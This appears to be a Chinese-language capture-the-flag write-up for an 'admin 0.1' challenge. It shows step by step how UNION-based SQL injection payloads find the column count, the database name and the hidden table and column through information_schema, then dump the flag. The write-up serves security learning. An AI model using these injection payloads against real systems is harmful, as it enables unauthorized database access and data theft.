admin 0.1
===

本題中藏有第二個 Flag 所以需要開挖資料庫。  

### Step 1
首先由以下注入指令得知，該資料表有四個欄位。  
並且 2 的位置可直接輸出。  
```
\' union select 1,2,3,4#
```

藉由位置 2 輸出資料庫名稱。  
得到 `login_as_admin0` 。  
```
\' union select 1,database(),3,4#
```

### Step 2
接著再藉由資料庫名稱找資料表名稱  
得 `h1dden_f14g`  
```SQL
SELECT table_name 
FROM information_schema.tables 
WHERE table_schema="login_as_admin0"
limit 0,1
```
```
\' union select 1,(SELECT table_name FROM information_schema.tables WHERE table_schema="login_as_admin0" limit 0,1),3,4#
```

### Step 3
然後就可以找到欄位名稱  
得到 `the_f14g`  
```SQL
SELECT column_name 
FROM information_schema.columns
WHERE TABLE_NAME=h1dden_f14g 
LIMIT 0,1
```
```
\' union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=h1dden_f14g limit 0,1),3,4#
```

### Step 4
到此已經掌握資料表、欄位名稱，便可以直接輸出資料內容。  

```=SQL
SELECT the_f14g
FROM h1dden_f14g
LIMIT 0,1
```
```
\'union select 1,(select the_f14g from h1dden_f14g limit 0,1),3,4#
```

## 授權聲明
[![copyright © 2019 By MksYi](https://img.shields.io/badge/copyright%20©-%202019%20By%20MksYi-blue.svg)](https://mks.tw/)
[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)